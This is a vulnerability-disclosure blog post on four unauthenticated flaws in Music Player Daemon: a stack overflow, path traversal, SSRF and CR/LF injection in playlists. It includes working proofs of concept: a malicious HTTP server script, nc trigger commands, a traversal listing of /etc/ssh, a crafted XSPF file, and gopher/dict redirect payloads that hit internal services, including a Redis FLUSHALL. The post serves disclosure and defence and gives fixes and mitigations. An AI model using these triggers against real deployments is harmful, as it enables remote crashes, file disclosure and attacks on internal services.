---
layout: post
title: "Four Bugs You Can Reach With `nc`"
subtitle: "A whitebox pass on the audio playback engine behind a long tail of self-hosted setups"
date: 2026-05-25
author: Matteo Strada (mstreet)
categories: [security-research, opensource, vulnerability-disclosure, cybersecurity, cve]
tags: [CVE, MPD, opensource, audio, ASan, SSRF, path-traversal, stack-overflow, CRLF-injection]
---


*A whitebox pass on the audio playback engine behind a long tail of self-hosted setups.*

This post documents four pre-authentication vulnerabilities found in [Music Player Daemon](https://www.musicpd.org) during a whitebox security assessment of the upstream project. All four reach the vulnerable code paths from the configuration the user receives out of the box and have been acknowledged and fixed upstream.

The work was done together with my friend and colleague Daniele Berardinelli (his blog [here](https://berardinellidaniele.com/)).

## Target

Music Player Daemon is the audio playback engine behind a long tail of headless music setups: Pi-based hifi streamers, NAS-attached players, Volumio/moOde/RuneAudio distros, kodi backends, and a non-trivial set of self-hosted music server appliances. It speaks a line-oriented text protocol on TCP/6600, decodes anything libavformat or libmad will accept, fetches HTTP streams, parses XSPF / ASX / RSS playlists, and exposes a directory of files via path-keyed commands. Approximately **103 kLOC of C++17** across 670 `.cxx` and 927 `.hxx` files, last release `v0.24.9` (2026-03-11), upstream branch declared as `0.25 (not yet released)`.

The upstream-default configuration ships `bind_to_address "any"`. With no `password` directive set in `mpd.conf`, every TCP client that can reach port 6600 is granted the full default permission set:

```
READ | ADD | PLAYER | CONTROL | ADMIN
```

That's the entire grammar: every finding in this post is reachable from that posture, no authentication step required. Versions checked: `master` HEAD at commit `2c662081a` plus the latest released tag `v0.24.9`, with each affected code region verified path-by-path via `git show v0.24.9:<file>`.

The attack surface and the four findings, in one frame:

<div align="center">
    <img src="/assets/images/mpd/mpd_bugs.png" style="width:60%;">
</div>

## Methodology

The four findings come out of a manual whitebox pass on the protocol-reachable surface: `src/command/`, `src/input/plugins/`, `src/tag/`, `src/decoder/plugins/`, `src/playlist/plugins/`, `src/storage/plugins/` supported by an ASan+UBSan instrumented build and libFuzzer harnesses for the parser entry points:

```sh
meson setup build_asan -Db_sanitize=address,undefined
meson compile -C build_asan
```

Each finding has a working PoC reproduced against the ASan build with a default `mpd.conf` and an unauthenticated TCP client on `127.0.0.1:6600`. The synthetic inputs (Xing/Information frame, XSPF, L24, ID3) were generated with small Python scripts while the SSRF protocol set was probed live against listening services for banner capture.

The first manual pass produced one of the four findings (the SSRF chain). Then, we moved into other classes of vulnerabilities, which yielded the other three. The five reportable issues that came out of the assessment were filed as separate hand-written GitHub issues on the upstream tracker on **2026-05-14**. Four landed fixes upstream and one we withdrew after a closer look at our own measurements (that postscript is at the end of the post).

## Finding 1: pcm_unpack_24be writes one slot past its buffer

The PCM L24 decode path has a sizing mismatch between two stack buffers in `pcm_stream_decode`:

```cpp
// src/decoder/plugins/PcmDecoderPlugin.cxx:160
StaticFifoBuffer<std::byte, 4096> buffer;
int32_t unpack_buffer[buffer.GetCapacity() / 3];   // 4096 / 3 = 1365
```

`ceil(4096 / 3)` is **1366**, not 1365. The unpack loop walks `src` in 3-byte strides:

```cpp
// src/pcm/Pack.cxx:82
void
pcm_unpack_24be(int32_t *dest,
                const uint8_t *src, const uint8_t *src_end) noexcept
{
    while (src < src_end) {
        *dest++ = ReadS24BE(src);
        src += 3;
    }
}
```

When the FIFO is full (`src_end - src == 4096`), the loop runs through `0, 3, 6, ..., 4095` with all 1366 iterations satisfying `src < src_end`. On the last iteration:

- `ReadS24BE` reads bytes at offsets 4095, 4096, 4097. The last two are off the end of the FIFO.
- The 32-bit result is written to `unpack_buffer[1365]`, four bytes past the array.

Three of those four overwritten bytes come straight from the HTTP body the attacker controls. Both buffers sit in the same stack frame, so the write lands on whatever the compiler placed adjacent.

An attacker-controlled `audio/L24` server is enough to trigger it. Body content doesn't matter, it just has to fill the FIFO:

```python
import http.server, socketserver
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        body = b"\xff" * 16384
        self.send_response(200)
        self.send_header("Content-Type", "audio/L24; rate=44100; channels=1")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)
    def log_message(self, *a): pass
socketserver.TCPServer(("127.0.0.1", 18001), H).serve_forever()
```

Trigger from any unauthenticated TCP client:

```sh
printf 'add http://127.0.0.1:18001/foo.l24\nplay\nstatus\nclose\n' \
  | nc -q 3 127.0.0.1 6600
```

ASan flags the OOB read immediately:

```
=================================================================
==1211570==ERROR: AddressSanitizer: stack-buffer-overflow on
address 0x7b6d83ef1880
READ of size 1 at 0x7b6d83ef1880 thread T4
    #0 pcm_unpack_24be(int*, unsigned char const*, unsigned char const*)
       ../src/pcm/Pack.cxx:86
    #1 pcm_stream_decode ../src/decoder/plugins/PcmDecoderPlugin.cxx:187
    ...

  This frame has 72 object(s):
    [2160, 6272) 'buffer' (line 160) <== Memory access at offset 6272
                                          overflows this variable
    [6528, 11988) 'unpack_buffer' (line 164)
```

On a hardened release build with `-fstack-protector-strong`, the 4-byte write clobbers the canary and `__stack_chk_fail()` terminates the daemon resulting in a clean remote crash on any MPD that accepts client connections. On a non-hardened release build the same write produces adjacent stack corruption with three attacker-controlled bytes.

The fix is a one-line tweak: size `unpack_buffer` to `(buffer.GetCapacity() + 2) / 3`, or constrain the slice handed to `pcm_unpack_24be` to a multiple of 3 bytes before the call. Either way the loop invariant ("`dest` has room for `(src_end - src) / 3` writes, rounded up") needs to actually hold.

Assigned CVE: [CVE-2026-49127](https://www.cve.org/CVERecord?id=CVE-2026-49127) **Music Player Daemon < 0.24.11 Stack Buffer Overflow via pcm_unpack_24be**

## Finding 2: LocalStorage accepts .. paths from listfiles and albumart

`LocalStorage::MapFSOrThrow` and `MapUTF8` (`src/storage/plugins/LocalStorage.cxx:86-101`) build the on-disk path by joining the storage root with the user-supplied URI as plain strings. No canonicalisation, so `..` segments survive in the string and get flattened by the kernel at `openat()` time.

```cpp
AllocatedPath
LocalStorage::MapFSOrThrow(std::string_view uri_utf8) const
{
    if (uri_utf8.empty())
        return base_fs;

    return base_fs / AllocatedPath::FromUTF8Throw(uri_utf8);
}
```

`base_fs / "../../../etc"` is just `<music_dir>/../../../etc` as a string. By the time the kernel sees it, you have walked out of `music_directory`.

Two MPD commands reach this code:

- **`listfiles`**: calls `LocalStorage::OpenDirectory` → `MapFSOrThrow` → enumerates whatever the resolved path points at. Any directory the MPD UID can `r-x` is now enumerable by an unauthenticated client. On the Debian/Ubuntu packaging, MPD runs as `mpd:audio`, which covers most of `/etc`, `/usr`, `/var`, and any world-readable subtree of `/home`.

- **`albumart`**: calls `read_db_art` → `MapUTF8` → walks a fixed name list `cover.{png,jpg,jxl,webp}` in the parent of the resolved path. Drop `..` into the URI and the "parent" becomes whatever directory you wanted to land in. Constrained to those four filenames, so on its own it isn't an arbitrary file read, but the bytes come back through the `binary` channel without text mangling.

The `listfiles` PoC is the cleanest:

```
$ printf 'listfiles "../../../../../../etc/ssh"\nclose\n' \
    | nc -q 2 127.0.0.1 6600
OK MPD 0.25.0
directory: ssh_config.d
file: ssh_host_rsa_key.pub
size: 563
Last-Modified: 2026-04-16T07:41:17Z
file: ssh_host_ed25519_key
size: 399
file: ssh_host_ecdsa_key
size: 505
...
OK
```

For the `albumart` half, plant a `cover.png` outside `music_directory`:

```
$ echo "PWND-FROM-OUTSIDE-MUSIC-DIR" > /tmp/escape-target/cover.png
$ printf 'binarylimit 8192\nalbumart "../../escape-target/x.mp3" 0\nclose\n' \
    | nc -q 2 127.0.0.1 6600
OK MPD 0.25.0
OK
size: 28
binary: 28
PWND-FROM-OUTSIDE-MUSIC-DIR
OK
```

Fix path is `std::filesystem::weakly_canonical` (or the equivalent helper on `AllocatedPath`) followed by a containment check against `base_fs`. Symlinks should be resolved too if you want to defend against the "plant a symlink inside `music_directory`" variant.

Assigned CVE: [CVE-2026-49128](https://www.cve.org/CVERecord?id=CVE-2026-49128) **Music Player Daemon < 0.24.11 Path Traversal via LocalStorage URI Handling**


## Finding 3: SSRF via libcurl + ffmpeg fall-through

Two pieces of the input-plugin stack compound here.

First, `CurlInputPlugin::input_curl_open` (`src/input/plugins/CurlInputPlugin.cxx:629`) accepts only `http://` and `https://`, and returns `nullptr` for anything else. After that returns nullptr, `src/input/Open.cxx:23-29` walks the rest of the plugin registry until something else claims the URL. And `FfmpegInputPlugin::input_ffmpeg_open` (`src/input/plugins/FfmpegInputPlugin.cxx:87`) doesn't check the scheme at all and if libavformat can claim it, the ffmpeg plugin runs with it.

The net effect is that every libavformat-registered protocol linked into the runtime becomes reachable from an unauthenticated client. What I saw on the test build:

| Scheme | What comes back |
|---|---|
| `sftp://` | full libssh handshake, the `SSH-2.0-libssh_<version>` banner is returned to the listener |
| `mmsh://` | HTTP `GET /probe` with `User-Agent: NSPlayer/4.1.0.3856` and a fixed `Pragma: xClientGUID={c77e7400-738a-11d2-9add-0020af0a3278}` (same GUID across MPD installs, so it fingerprints the daemon) |
| `rtmp://` | RTMP C0/C1 handshake bytes (~1 KB) sent to the attacker |
| `gopher://` | TCP connect, ffmpeg logs `Gopher protocol type '_' not supported yet!` at the daemon side |
| `ftp://` | TCP connect, FTP greeting consumed by the daemon |

The sftp case is the cleanest because libssh hands you its version in the banner. Listen on a port:

```
$ nc -lvnp 18091
```

Then from another terminal:

```
$ printf 'readcomments sftp://127.0.0.1:18091/x\nclose\n' \
    | nc -w3 127.0.0.1 6600
```

The listener sees:

```
SSH-2.0-libssh_0.12.0
```

That's the fingerprint of the libssh build linked to libavformat on the target host. The other schemes in the table are reached the same way, just swap the protocol in the trigger command. Reachable via `readcomments`, `albumart`, `readpicture`, `add`, and `load`.

The second piece `CurlInputPlugin::InitEasy` (`src/input/plugins/CurlInputPlugin.cxx:499`) sets `CURLOPT_FOLLOWLOCATION 1L` and never sets `CURLOPT_REDIR_PROTOCOLS_STR`. On libcurl < 7.85.0 (August 2022), the default for `CURLOPT_REDIR_PROTOCOLS` is `CURLPROTO_ALL` minus `FILE | SCP | SMB | SMBS` meaning gopher, ftp, sftp, telnet, ldap, dict, rtmp, rtsp redirects all follow without restriction (`file://` and `smb://` were excluded from the default and aren't reachable via this path). A malicious HTTP server can answer the daemon with `Location: gopher://internal-redis:6379/_FLUSHALL%0d%0a`, `Location: ftp://internal-fileserver/`, or `Location: dict://internal-memcached:11211/stats`, bypassing the http(s)-only check that `input_curl_open` enforces because there is no `CURLOPT_REDIR_PROTOCOLS_STR` to constrain where the daemon will follow a 3xx. LTS distros that ship libcurl pre-7.85 (Debian 11, Ubuntu 20.04, RHEL 8) are squarely in scope.

The fix has two parts: in `InitEasy`, set `CURLOPT_REDIR_PROTOCOLS_STR` to `"http,https"` explicitly (so the daemon is safe on every libcurl version, not just the ones shipped after 2022), in `input_ffmpeg_open`, add a small scheme allow-list that mirrors the set the http(s) gate is meant to enforce. The current "if libavformat claims it, we run it" behaviour is too permissive given the plugin sits behind unauthenticated commands.

Assigned CVE: [CVE-2026-49129](https://www.cve.org/CVERecord?id=CVE-2026-49129) **Music Player Daemon < 0.24.11 SSRF via CurlInputPlugin**

## Finding 4: XSPF location smuggles CR/LF through Expat

This one is my favorite of the four, because the root cause is in **how Expat interprets the XML grammar**, not in MPD's own logic.

`xspf_char_data` (`src/playlist/plugins/XspfPlaylistPlugin.cxx:159`) appends bytes from Expat's character-data callback into `parser->location` without filtering. The trick is that **Expat decodes XML numeric character references before invoking the callback** `&#x0A;` becomes the literal byte `\n`, `&#x0D;` becomes `\r`. By the time the bytes hit `xspf_char_data`, the encoded references are already raw control characters.

The URI then flows through `DetachedSong` into two writers:

- `Response::Fmt("file: {}\n", song.GetURI())` in `src/song/SongPrint.cxx` the protocol response stream.
- `src/queue/Save.cxx` the state file written to disk and replayed on every daemon start.

MPD's wire protocol is `key: value\n` per line. An embedded `\n` in the URI lets the attacker forge arbitrary key/value lines in `playlistinfo`, `currentsong`, `listplaylist`, all attached to a single playlist entry.

Tag values are sanitised through `FixTagString` / `clear_non_printable` (`src/tag/FixString.cxx:86-128`) every non-printable byte is replaced with a space, consistently across the tag ingestion paths. URIs aren't. `playlist_check_translate_song` calls `uri_squash_dot_segments` (`PlaylistSong.cxx:91`) to strip `..` but doesn't filter control bytes, and `SongLoader::LoadSong` builds the `DetachedSong` from whatever bytes are left.

A malicious XSPF:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<playlist xmlns="http://xspf.org/ns/0/" version="1">
  <trackList>
    <track>
      <location>http://attacker.example/legit.mp3&#x0A;file: pwned-by-xspf-injection&#x0A;Time: 1&#x0A;Id: 9999&#x0A;Title: pwned</location>
      <title>injected</title>
    </track>
  </trackList>
</playlist>
```

Trigger from any unauthenticated client:

```
$ printf 'clear\nload "http://127.0.0.1:8001/inject.xspf"\nplaylistinfo\nclose\n' \
    | nc -q 3 127.0.0.1 6600 | cat -A

OK MPD 0.25.0$
OK$
OK$
file: http://attacker.example/legit.mp3$
file: pwned-by-xspf-injection$              <-- INJECTED
Time: 1$                                    <-- INJECTED
Id: 9999$                                   <-- INJECTED
Title: pwned$                               <-- INJECTED
Title: injected$                            <-- legitimate field
Pos: 0$
Id: 1$
OK$
```

Four fabricated key/value lines smuggled through a single `<location>` element (plus the legitimate `file:` line at the top, which carries the attacker URI verbatim). Downstream impact:

- MPD clients (`mpc`, `ncmpc`, MPDroid, ympd) that scrape `playlistinfo` and don't double-check that all fields under a `file:` line belong to the same song will render forged Title / Time / file values for unrelated tracks.
- Anything that pipes `playlistinfo` to a scrobbler will report the forged `file:` line as the current track.
- Web frontends that render playlist fields into HTML without escaping inherit a stored XSS through the same URI bytes not strictly MPD's threat model, but worth flagging downstream.
- The state-file persistence path means a poisoned playlist survives a daemon restart and replays on every boot.

Fix is running the accumulated location through the same kind of control-character filter as `FixTagString` (or at minimum rejecting CR / LF / anything below 0x20 except whatever URIs legitimately need). A defence-in-depth `Response::FmtUri` helper on the response writer side closes the same surface from the other end. The state file writer in `queue/Save.cxx` is worth checking too if it doesn't escape control bytes on write, a poisoned state file survives a daemon restart on its own.

Assigned CVE: [CVE-2026-49130](https://www.cve.org/CVERecord?id=CVE-2026-49130) **Music Player Daemon < 0.24.11 CRLF Injection via XspfPlaylistPlugin.cxx**


## A finding we got wrong

Worth saying explicitly: a fifth issue went out to the tracker alongside these four, and we withdrew it.

The MAD MP3 decoder (`src/decoder/plugins/MadDecoderPlugin.cxx:161-162`) eagerly allocates two arrays sized by `max_frames`, which is read from the Xing tag's `frames` field attacker-controlled file metadata. The cap is `8 * 1024 * 1024`. At the cap:

```
new long[8M]           = 8 * 8,388,607 =  64 MiB
new mad_timer_t[8M]    = 16 * 8,388,607 = 128 MiB
                                       --------
                                         192 MiB per song
```

My original writeup called this "192 MiB committed per song" and framed it as a memory-pressure DoS on small embedded deployments.

The issue is that `new T[N]` for POD types does not touch the pages. Both calls go straight to `mmap(MAP_ANONYMOUS)` and reserve virtual address space, not committed RSS. The writes to `frame_offsets[current_frame]` and `times[current_frame]` only happen when MAD has actually parsed a frame. To commit the full 192 MiB the daemon would need to parse on the order of 8 million real frames, which at MPEG-2.5 L3 minimum bitrates is hundreds of MB on the wire that's deflation on the attack-to-defense ratio, not amplification. A side-by-side `run_decoder` against my crafted `mad_xing.mp2` and against an empty MP2 showed exactly the same 54 MB maxresident, exactly because the seek-table reservations don't contribute to RSS until they're written.

I went back and re-read my own PoC notes. The runtime sampling for the issue had this line right there:

> `VmRSS: 162 344 kB ... VmHWM: 170 128 kB    (+37 MiB resident, +192 MiB virtual)`

The right number was in the report the whole time. The headline used the virtual one and carried it through the attack chain as committed memory. The queue-multiplication argument I built on top of it inherited the same mistake 16k sequential virtual reservations don't accumulate any more than 1 does, because the kernel returns the mmap region between songs.

Withdrawal was the only honest move. The GitHub issue is closed with a brief withdrawal note that names the error mechanically (VmPeak conflated with VmRSS) and credits the `run_decoder` disproof. The other four findings are stronger for it.

---

## CVEs

CVE IDs are pending VulnCheck assignment.

| # | Description | Attack vector | CVSS |
|---|---|---|---|
| CVE-2026-49127 | PCM L24 decoder stack OOB (`pcm_unpack_24be` / `unpack_buffer` sizing) | Network, default config | 8.6 |
| CVE-2026-49128 | LocalStorage path traversal via `listfiles` + `albumart` | Network, default config | 7.5 |
| CVE-2026-49129 | SSRF via `CurlInputPlugin` + `FfmpegInputPlugin` fall-through + missing `CURLOPT_REDIR_PROTOCOLS_STR` | Network, default config | 5.8 |
| CVE-2026-49130 | XSPF `<location>` CR/LF injection via Expat numeric character references | Network, default config | 5.3 |

These are independent of any prior MPD CVEs.

---

## Responsible Disclosure

MPD's upstream documentation directs all security reports to the public GitHub issue tracker, and that's the channel we used. CVE assignment for the four findings was coordinated with VulnCheck, whose support in the process is gratefully acknowledged.

Operators of self-hosted MPD deployments are advised to:

- Set a `password` directive in `mpd.conf` and split permissions across users so that the anonymous default permission set is empty or read-only.
- Set `bind_to_address "127.0.0.1"` on single-host deployments where MPD does not need to be reachable from other machines on the network.
- Apply the upstream fixes (commit hashes referenced in the per-issue GitHub threads) by upgrading to the next maintenance release on the v0.24.x line, or to the next tagged 0.25.x once cut.

Disclosure timeline:

- **2026-04-19** - Engagement start (manual whitebox review against `master @ 2c662081a`).
- **2026-05-11** - Initial private outreach to the maintainer.
- **2026-05-14** - Five technical writeups filed as separate GitHub issues on the upstream tracker.
- **2026-05-15..23** - Acknowledgement and fix landing upstream for the four findings above. One finding (MAD `xing.frames` allocation) withdrawn after closer review of our own measurements.
- **2026-05-27** - CVE request submitted to VulnCheck (CNA). Public advisory (this post).

The PoC artefacts in this post are intentionally minimal and reproducible: their purpose is to verify the bug on your own deployment, not to weaponize anyone else's.
